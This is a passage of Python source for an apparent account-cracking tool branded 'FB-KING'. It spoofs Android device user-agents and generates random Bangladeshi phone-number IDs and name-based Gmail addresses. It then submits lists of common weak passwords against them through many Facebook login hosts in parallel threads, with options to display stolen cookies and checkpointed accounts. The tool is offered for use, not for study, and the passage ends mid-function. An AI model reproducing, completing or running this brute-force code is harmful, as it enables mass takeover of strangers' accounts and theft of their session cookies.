	daa=f"Mozilla/5.0 (Linux; Android 13; CPH2359 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(111,121))}.0.{str(rr(5563,6167))}.{str(rr(40,180))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.26.115;]"
#TP1A.220905.001 #13
#Build/SP1A.210812.016 #12
#Chrome/111.0.5563.58
	daaa=f"Mozilla/5.0 (Linux; Android 12; CPH2359 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(105,121))}.0.{str(rr(5195,6167))}.{str(rr(40,180))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.26.115;]"
	da=rc([daa,daaa])
#print(da)
#opp reno 8 T
	db=f"Mozilla/5.0 (Linux; Android 13; CPH2481 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(110,121))}.0.{str(rr(5481,6167))}.{str(rr(40,180))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]"
	ugenn=rc([ca,cb,cd,ce,cf,cg,ch,ci,cj,ck,cl,cm,cn,co,cpp,cppp,cq,cr,cs,ct,cu,cv,cw,cx,cy,cz,da,db])
	ugen.append(ugenn)
	# ------------redmi user agent----------------
    
    #redmi note 13
	rc=random.choice
	rr=random.randint
	#Google Chrome 117.0.5938.89
	berson=f"{str(rr(117,121))}.0.{str(rr(5938,6167))}.{str(rr(40,150))}"
	na=f"Mozilla/5.0 (Linux; Android 11; Redmi Note 13 Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(115,121))}.0.{str(rr(6000,6167))}.{str(rr(40,150))} Mobile Safari/537.36"
#	print(ra)
	#redmi note 13 pro
	nb=f"Mozilla/5.0 (Linux; Android 14; 2210132C Build/UKQ1.230705.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(118,121))}.0.{str(rr(6000,6167))}.{str(rr(40,150))} Mobile Safari/537.36"
	#poco x4 pro 5 g
	nc=f"Mozilla/5.0 (Linux; Android 12; 2201116PI Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(110,121))}.0.{str(rr(5481,6167))}.{str(rr(40,153))} Mobile Safari/537.36"
	#Build/RKQ1.211001.001#11
	#Build/TKQ1.221114.001#13
	nd=f"Mozilla/5.0 (Linux; Android 11; 2201116PI Build/RKQ1.211001.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(110,121))}.0.{str(rr(5481,6167))}.{str(rr(40,153))} Mobile Safari/537.36"
	ne=f"Mozilla/5.0 (Linux; Android 11; 2201116PI Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(110,121))}.0.{str(rr(5481,6167))}.{str(rr(40,153))} Mobile Safari/537.36"
	#poco f5
	nf=f"Mozilla/5.0 (Linux; Android 13; 23049PCD8G Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(115,121))}.0.{str(rr(5790,6167))}.{str(rr(40,150))} Mobile Safari/537.36"
#	redmi 10
	ng=f"Mozilla/5.0 (Linux; Android 10; Mi Note 10 Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(115,121))}.0.{str(rr(5790,6167))}.{str(rr(50,150))} Mobile Safari/537.36"
	nh=f"Mozilla/5.0 (Linux; Android 9; Mi Note 10 Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(115,121))}.0.{str(rr(5790,6167))}.{str(rr(50,150))} Mobile Safari/537.36"
	#Build/PKQ1.190302.001#9
	#redmi 10 pro
	ni=f"Mozilla/5.0 (Linux; Android 12; M2101K6G Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(114,121))}.0.{str(rr(5735,6167))}.{str(rr(50,165))} Mobile Safari/537.36"
	#Chrome/114.0.5735.130
	#print(ri)
	nj=f"Mozilla/5.0 (Linux; Android 11; M2101K6G Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(114,121))}.0.{str(rr(5735,6167))}.{str(rr(50,165))} Mobile Safari/537.36"
	#redmi note 11
	nk=f"Mozilla/5.0 (Linux; Android 12; 2201117TG Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(117,121))}.0.{str(rr(6000,6167))}.{str(rr(40,150))} Mobile Safari/537.36"
	nl=f"Mozilla/5.0 (Linux; Android 13; 2201117TG Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(117,121))}.0.{str(rr(6000,6167))}.{str(rr(40,150))} Mobile Safari/537.36"
	#Build/TKQ1.221114.001#13
	#Build/RKQ1.211001.001#11
	nm=f"Mozilla/5.0 (Linux; Android 11; 2201117TG Build/RKQ1.211001.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(117,121))}.0.{str(rr(6000,6167))}.{str(rr(40,150))} Mobile Safari/537.36"
#	redmi note 11 5 g
	nn=f"Mozilla/5.0 (Linux; Android 11; 21091116AC Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(117,121))}.0.{str(rr(6000,6167))}.{str(rr(40,150))} Mobile Safari/537.36"
	#Build/TP1A.220624.014#13
	#Build/SP1A.210812.016#12
	no=f"Mozilla/5.0 (Linux; Android 13; 21091116AC Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(117,121))}.0.{str(rr(6000,6167))}.{str(rr(40,150))} Mobile Safari/537.36"
	np=f"Mozilla/5.0 (Linux; Android 12; 21091116AC Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(117,121))}.0.{str(rr(6000,6167))}.{str(rr(40,150))} Mobile Safari/537.36"
	#redmi 12
	nq=f"Mozilla/5.0 (Linux; Android 13; 23021RAAEG Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(117,121))}.0.{str(rr(6000,6167))}.{str(rr(40,150))} Mobile Safari/537.36"
	#Build/SKQ1.220303.001#12
	
	nr=f"Mozilla/5.0 (Linux; Android 12; 23021RAAEG Build/SKQ1.220303.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(117,121))}.0.{str(rr(6000,6167))}.{str(rr(40,150))} Mobile Safari/537.36"
	
#	redmi 12 pro
	ns=f"Mozilla/5.0 (Linux; Android 13; {rc(['2201122C','2201122G'])} Build/TKQ1.220807.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(114,121))}.0.{str(rr(5735,6167))}.{str(rr(40,196))} Mobile Safari/537.36"
	#Build/SKQ1.211006.001#12
	nt=f"Mozilla/5.0 (Linux; Android 12; {rc(['2201122C','2201122G'])} Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(114,121))}.0.{str(rr(5735,6167))}.{str(rr(40,196))} Mobile Safari/537.36"
#	redmi note 8
	nu=f"Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(114,121))}.0.{str(rr(5735,6167))}.{str(rr(40,196))} Mobile Safari/537.36"
	#M1908C3JH, M1908C3JG, M1908C3JI
	#Build/RKQ1.201004.002#11
	#Build/PKQ1.190616.001
	nv=f"Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(114,121))}.0.{str(rr(5735,6167))}.{str(rr(40,196))} Mobile Safari/537.36"
	nw=f"Mozilla/5.0 (Linux; Android 9; Redmi Note 8 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(114,121))}.0.{str(rr(5735,6167))}.{str(rr(40,196))} Mobile Safari/537.36"
#	redmi 8 pro
	nx=f"Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(114,121))}.0.{str(rr(5735,6167))}.{str(rr(40,196))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]"
	#Build/RP1A.200720.011#11
	#Build/PPR1.180610.011#9
	ny=f"Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(114,121))}.0.{str(rr(5735,6167))}.{str(rr(40,196))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]"
	nz=f"Mozilla/5.0 (Linux; Android 9; Redmi Note 8 Pro Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(114,121))}.0.{str(rr(5735,6167))}.{str(rr(40,196))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]"
	#redmi note 7
	naa=f"Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{berson} [FB_IAB/FB4A;FBAV/329.0.0.29.120;]"
#	print(raa)
	#Build/PKQ1.180904.001#9
	nab=f"Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{berson} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/329.0.0.29.120;]"
#	7 pro
	nac=f"Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Pro Build/PKQ1.181203.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{berson} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/437.0.0.35.116;]"
	#Build/QKQ1.190915.002#10
	nad=f"Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Pro Build/QKQ1.190915.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{berson} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/437.0.0.35.116;]"
#	6 pro
	nae=f"Mozilla/5.0 (Linux; Android 9; Redmi Note 6 Pro Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{berson} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/280.0.0.48.122;]"
	naf=f"Mozilla/5.0 (Linux; Android 9; Redmi Note 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{berson} Mobile Safari/537.36"
	#redmi 11 T pro
	nag=f"Mozilla/5.0 (Linux; Android 11; {rc(['2107113SG','2107113SI'])} Build/RKQ1.210503.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{berson} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/301.0.0.37.477;]"
	nah=f"Mozilla/5.0 (Linux; Android 13; {rc(['2107113SG','2107113SI'])} Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{berson} Mobile Safari/537.36"
	note=rc([na,nb,nc,nd,ne,nf,ng,nh,ni,nj,nk,nl,nm,nn,no,np,nq,nr,ns,nt,nu,nv,nw,nx,ny,nz,naa,nab,nac,nad,nae,naf,nag,nah])
	ugen.append(note)

		
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
###----------[ PEH ]----------###
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
GREEN ='\x1b[38;5;46m'
RED = '\x1b[38;5;46m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
R = '{RED}' 
G = '{GREEN}' 
Y = '\033[1;33m' 
Q = '\033[1;37m'
T = '\033[1;34m'
x = '\33[m' 
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
###----------[ CONVERT LINE ]----------###
led = f'{B} -{H}-{M}-{K}-{A}-{B}-{N}-{H}-{P}-{N}-{B}-{H}-{M}-{U}-{K}-{B}-{O}-{H}-{P}-{M}-{B}-{H}-{M}-{K}-{A}-{B}-{N}-{H}-{P}-{N}-{B}-{K}-{H}-{M}-{U}-{K}-{B}-{O}-{H}-{P}{M}-{B}'
###----------[ BANNER MENUH ]----------###
gen=f' {K}[{GREEN}√{K}] {P}'
dot=f' {K}[{GREEN}•{K}] {P}'
rdd=f' {K}[{RED}•{K}] {P}'
rgen=f' {K}[{RED}√{K}] {P}'
wt=f' {K}[{GREEN}?{K}] {P}'
fst=f'{dot}[{H}sathi{M}={H}abir{M}={H}tisha{M}={H}mahin{M}={H}samim{P}]'
lst=f'{dot}[{H}akter{M}={H}khan{M}={H}hasan{M}={H}ahmed{M}={H}ali{P}]'
limitt=f'{dot}[{H}5000{M}={H}10000{M}={H}15000{M}={H}20000{M}={H}50000{P}]'
c7=f'{dot}[{H}0177{M}={H}0196{M}={H}0161{M}={H}0176{M}={H}0196{M}={H}0179{P}]'
c6=f'{dot}[{H}01778{M}={H}01991{M}={H}01661{M}={H}01776{M}={H}01996{M}={H}01779{P}]'
c8=f'{dot}[{H}017{M}={H}019{M}={H}016{M}={H}013{M}={H}018{M}={H}014{M}={H}015{P}]'
mtd,cp_xdx,cokix=[],[],[]
def clear():
 os.system('clear')
def banner():
    #os.system('clear')
    print(f"""   \033[32;1m    __________        __ __ _____   ________
   \033[33;1m   / ____/ __ )      / //_//  _/ | / / ____/
   \033[31;1m  / /_  / __  |_____/ ,<   / //  |/ / / __  
   \033[34;1m / __/ / /_/ /_____/ /| |_/ // /|  / /_/ /  
   \033[32;1m/_/   /_____/     /_/ |_/___/_/ |_/\____/                                              
  \033[91;1m  ╔════════════════════════════════════════╗
   {H} ║{P}[{H}•{P}] Author    :{warna} FB-KING                 {N}{H}║
  {H}  ║{P}[{H}•{P}] Facebook  : {H}Sabbir Ahmed            {N}{H}║
    {H}║{P}[{H}•{P}] Whatsapp  : {M}+8801948085481          {N}{H}║
  {H}  ║{P}[{H}•{P}] Github    : {K}github.com/FB-KING{N}    {H}  ║
  {H}  ║{P}[{H}•{P}] Status    : {H}PREMIUM {P}     {N}      {H}     ║
   {H} ║{P}[{H}•{P}] Network   : {H}3G{N}, {H}4G/5G{N}, {H}ON{N}     {H}      ║
   {H} ║{P}[{H}•{P}] Version   : {H}2.0.9                   ║
   {H} ║{P}[{H}•{P}] Tools     : {H}ULTRA GREEN             ║
   {M} ╚════════════════════════════════════════╝ {P}""")
    print(f"""{GREEN}    SELL DONE{P}
 {K}[{H}√{K}]{P} This message is for my haters 
 {K}[{H}√{K}]{P}       {H} The KING Is BACK 
 {K}[{H}√{K}]{P} Successfully Update Done {H}2.0.9""");print(led)


c0=('ht')
c4=('tps://')
c1=('tinyurl')
c2=('.com/')
c3=('2n8sj2p4')
cu=('Ki')
cuu=('ngcy')
cuuu=('ber')

c0=('ht')
c4=('tps://')
c1=('tinyurl')
c2=('.com/')
c3=('2n8sj2p4')
cu=('Ki')
cuu=('ngcy')
cuuu=('ber')
#
#
gffff=('FB-')
kffff=('KING')
c0=('ht')
c4=('tps://')
c1=('tinyurl')
c2=('.com/')
c3=('2n8sj2p4')
cu=('Ki')
cuu=('ngcy')
cuuu=('ber')

def lock_ck(idf):		
	datar=requests.get(f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={uid}").text
	result=str(datar)
	if "live"== result.lower():
		return "unlock"	
	else:
		return "lock"

def mainx():
    clear();banner()
    print(f"{K} [{H}1{K}] {WHITE}Create File ")
    print(f"{K} [{H}2{K}] {WHITE}Public Cloning ")
    print(f"{K} [{H}3{K}] {WHITE}File   Cloning ")
    print(f"{K} [{H}4{K}] {WHITE}Random Cloning {H}more..7+")
    print(f'{K} [{H}5{K}] {WHITE}Separate Ids ')
    print(f'{K} [{H}6{K}] {WHITE}Remove Duplicate Ids')
    print(f'{K} [{H}7{K}] {N}Follow Github ')
    print(f'{K} [{H}8{K}] {N}Contract FB-KING')
    print(f"{K} [{M}0{K}] {WHITE}Exit Tools ");print(led)
    mahin = input(f'{wt}Select menu {M}:{H} ')
    if mahin in ["1","01"]:
        exit()
    elif mahin in ["2","02"]:
        exit()
    elif mahin in ["3","03"]:
        cr()
    elif mahin in ["4","04"]:
        mainx2()
    elif mahin in ["5","05"]:
        sep()
    elif mahin in ["6","06"]:
     dupcutter()
    elif mahin in ["7","07"]:
     os.system("xdg-open https://github.com/FB-KING");mainx()
    elif mahin in ["8","08"]:
     os.system("https://www.facebook.com/sabbir171027");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}FB-KING {P}Terminal ');os.system("xdg-open https://www.facebook.com/FB.KING.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.king.cyber/?ref=share');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/FB.KING.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()
def mainx2():
    os.system("clear")
    banner()
    print(f"{K} [{H}1{K}] {WHITE}Random Cloning {H}6 Digit")
    print(f"{K} [{H}2{K}] {WHITE}Random Cloning {H}7 Digit ")
    print(f"{K} [{H}3{K}] {WHITE}Random Cloning {H}8 Digit ")
    print(f"{K} [{H}4{K}] {WHITE}Random Cloning {H}Pak/Ind")
    print(f"{K} [{H}5{K}] {WHITE}Gmail  Cloning {H}V1")
    print(f"{K} [{H}6{K}] {WHITE}Gmail  Cloning {H}V2")
    print(f"{K} [{M}0{K}] {WHITE}Back To Menu");print(led)
    mahin = input(f'{wt}Select menu {M}:{H} ')
    if mahin in ["1","01"]:
        x6()
    elif mahin in ["2","02"]:
        x7()
    elif mahin in ["3","03"]:
        x8()
    elif mahin in ["4","04"]:
        xp()
    elif mahin in ["5","05"]:
     gf1()
    elif mahin in ["6","06"]:
     gf2()
    elif mahin in ["0","00"]:
     mainx()
    else:
        print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/FB.KING.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()

# GMAIL CRACK -- MAIN DEF #
def gf1(): 
    idf=[]
    os.system('clear');banner();print(fst);print(led)
    first = input(f'{dot}First Name {M}: {H}');print(led);print(lst);print(led)
    last = input(f'{dot}Last Name {M}: {H}');print(led);print(limitt);print(led)
    limit = int(input(f'{dot}Crack Limit {M}: {H}'))
    domain = '@gmail.com'
    print(led)
    xd_cp=input(f'{wt}Cloning Show cp Account  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
    if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
    else:cp_xdx.append('n')
    print(led)
    cokixx=input(f'{wt}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
    if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
    else:cokix.append('n')
    tkk = first+last
    banner();print(f"{dot}{P}Gmail Ids {RED}: {tkk[:4]}****{domain}");print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
    print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');print(led)
    mthd = input(f'{wt}Select Method {M}:{H} ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        idf.append(nmp)
    with tred(max_workers=40) as king_xd:
        os.system('clear')
        idx = str(len(idf))
        tk = first+last
        os.system("clear");banner();print(f'{dot}Method    {RED}:{H} M-{mthd}-P-Auto');print(f'{dot}Gmail ids {RED}:{H} {tk[:4]}****{domain}');print(f'{dot}Total Ids {RED}: {H}'+idx);print(led)
        for number in idf:
            idf = first+'.'+last+'.'+number+domain
            pwv= [first+last,first+' '+last,first+last+'12',last,first+number,first+'123',first+'1234',first+last+'12'] 
            if mthd in ['1','01']:king_xd.submit(m1,idf,pwv)
            elif mthd in ['2','02']:king_xd.submit(m2,idf,pwv)
            elif mthd in ['3','03']:king_xd.submit(m3,idf,pwv)
            elif mthd in ['4','04']:king_xd.submit(m4,idf,pwv)
            elif mthd in ['5','05']:king_xd.submit(f1,idf,pwv)
            elif mthd in ['6','06']:king_xd.submit(f1,idf,pwv)
            else:
               king_xd.submit(m5,idf,pwv)
    print('');print(f'{N} Hi Dear User Crack process has been completed');print(f' {P}Total ok : {H}'+(ok)) #;print(f' {P}Total cp : {K}'+str(len(cp)));print('')
    input('Press Enter To Go Menu');os.system('python CRAZY-GREEN.py')
def gf2(): 
    idf=[]
    os.system('clear');banner();print(fst);print(led)
    first = input(f'{dot}First Name {M}: {H}');print(led);print(lst);print(led)
    last = input(f'{dot}Last Name {M}: {H}');print(led);print(limitt);print(led)
    limit = int(input(f'{dot}Crack Limit {M}: {H}'))
    domain = '@gmail.com'
    print(led)
    xd_cp=input(f'{wt}Cloning Show cp Account  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
    if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
    else:cp_xdx.append('n')
    print(led)
    cokixx=input(f'{wt}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
    if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
    else:cokix.append('n')
    tkk = first+last
    banner();print(f"{dot}{P}Gmail Ids {RED}: {tkk[:4]}****{domain}");print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
    print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');print(led)
    mthd = input(f'{wt}Select Method {M}:{H} ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(3))
        idf.append(nmp)
    with tred(max_workers=40) as king_xd:
        os.system('clear')
        idx = str(len(idf))
        tk = first+last
        os.system("clear");banner();print(f'{dot}Method    {RED}:{H} M-{mthd}-P-Auto');print(f'{dot}Gmail ids {RED}:{H} {tk[:4]}****{domain}');print(f'{dot}Total Ids {RED}: {H}'+idx);print(led)
        for number in idf:
            idf = first+'.'+last+number+domain
            pwv= [first+last,first+' '+last,first+last+'12',last,first+number,first+'123',first+'1234',first+last+'12',first+last+'123'] 
            if mthd in ['1','01']:king_xd.submit(m1,idf,pwv)
            elif mthd in ['2','02']:king_xd.submit(m2,idf,pwv)
            elif mthd in ['3','03']:king_xd.submit(m3,idf,pwv)
            elif mthd in ['4','04']:king_xd.submit(m4,idf,pwv)
            elif mthd in ['5','05']:king_xd.submit(f1,idf,pwv)
            elif mthd in ['6','06']:king_xd.submit(f1,idf,pwv)
            else:
               king_xd.submit(m5,idf,pwv)
    print('');print(f'{N} Hi Dear User Crack process has been completed');print(f' {P}Total ok : {H}'+(ok)) #;print(f' {P}Total cp : {K}'+str(len(cp)));print('')
    input('Press Enter To Go Menu');os.system('python CRAZY-GREEN.py')

def x8():
  freef="free.facebook.com"
  mbasicf="mbasic.facebook.com"
  pf="p.facebook.com"
  mf="m.facebook.com"
  xf="x.facebook.com"
  alphaf="m.alpha.facebook.com"
  
  user=[]
  os.system('clear');banner();print(c8);print(led)
  kode = input(f'{dot}Select Code {M}: {H}');print(led);print(limitt);print(led)
  limit = int(input(f'{dot}Crack Limit {M}: {H}'));print(led)
  xd_cp=input(f'{wt}Cloning Show cp Account  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
  print(led)
  cokixx=input(f'{wt}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  else:cokix.append('n')
  clear();banner();print(f"{dot}{P}Number  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M.Fb{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M.Fb{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}P.Fb{P}]')
  print(f' {K}[{H}4{K}] {P}Method [{H}X.Fb{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}Alpha.Fb{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}Free.Fb{P}]');print(f' {K}[{H}7{K}] {P}Method [{H}Mbasic.Fb{P}]');print(led)
  hc = input(f'{wt}Select Method {M}:{H} ')
  for nmbr in range(limit):
    koda = ''.join(random.choice(string.digits) for _ in range(2))
    kodb = ''.join(random.choice(string.digits) for _ in range(2))
    nmp = ''.join(random.choice(string.digits) for _ in range(4))
    user.append(nmp)
  with tred(max_workers=60) as king_xd:
    os.system('clear')
    tl = str(len(user))
    banner();print(f'{dot}Method{RED} : {H}M-'+hc);print(f'{dot}Number{RED} : {H}{kode}');print(f'{dot}Limit {RED} : {H}{tl}');print(led)
    for guru in user:
      idf = kode+koda+kodb+guru
      pwv = [koda+kodb+guru,koda+kodb+guru[1:],idf,kode+koda+kodb,kode+koda+kodb[1:],'@#@#@#','bangladesh','free fire','i love you']
      if hc in ['1','01']:
        king_xd.submit(m1,idf,pwv,'M1')
        #mostakim='M1'
      elif hc in ['2','02']:
        king_xd.submit(m9,idf,pwv,'m.facebook.com','M2')
        #mostakim='M2'      
      elif hc in ['3','03']:
        king_xd.submit(m9,idf,pwv,'p.facebook.com','M3')
        #mostakim='M3'
      elif hc in ['4','04']:
        king_xd.submit(m9,idf,pwv,'x.facebook.com','M4')
        #mostakim='M4'
      elif hc in ['5','05']:
        king_xd.submit(m9,idf,pwv,'m.alpha.facebook.com','M5')
        #mostakim='M5'
      elif hc in ['6','06']:
        king_xd.submit(m9,idf,pwv,'free.facebook.com','M6')
        #mostakim='M6'
      elif hc in ['7','07']:
        king_xd.submit(m9,idf,pwv,'mbasic.facebook.com','M7')
        #mostakim='M7'
      else:
        king_xd.submit(main,idf,pwv)
       
#def x82
def r8():
  freef="free.facebook.com"
  mbasicf="mbasic.facebook.com"
  pf="p.facebook.com"
  mf="m.facebook.com"
  xf="x.facebook.com"
  alphaf="m.alpha.facebook.com"
  
  user=[]
  os.system('clear');banner();print(c8);print(led)
  kode = input(f'{dot}Select Code {M}: {H}');print(led);print(limitt);print(led)
  limit = int(input(f'{dot}Crack Limit {M}: {H}'));print(led)
  xd_cp=input(f'{wt}Cloning Show cp Account  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
  print(led)
  cokixx=input(f'{wt}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  else:cokix.append('n')
  clear();banner();print(f"{dot}{P}Number  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M.Fb{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M.Fb{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}P.Fb{P}]')
  print(f' {K}[{H}4{K}] {P}Method [{H}X.Fb{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}Alpha.Fb{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}Free.Fb{P}]');print(f' {K}[{H}7{K}] {P}Method [{H}Mbasic.Fb{P}]');print(led)
  hc = input(f'{wt}Select Method {M}:{H} ')
  for nmbr in range(limit):
    koda = ''.join(random.choice(string.digits) for _ in range(2))
    kodb = ''.join(random.choice(string.digits) for _ in range(2))
    nmp = ''.join(random.choice(string.digits) for _ in range(4))
    user.append(nmp)
  with tred(max_workers=60) as king_xd:
    os.system('clear')
    tl = str(len(user))
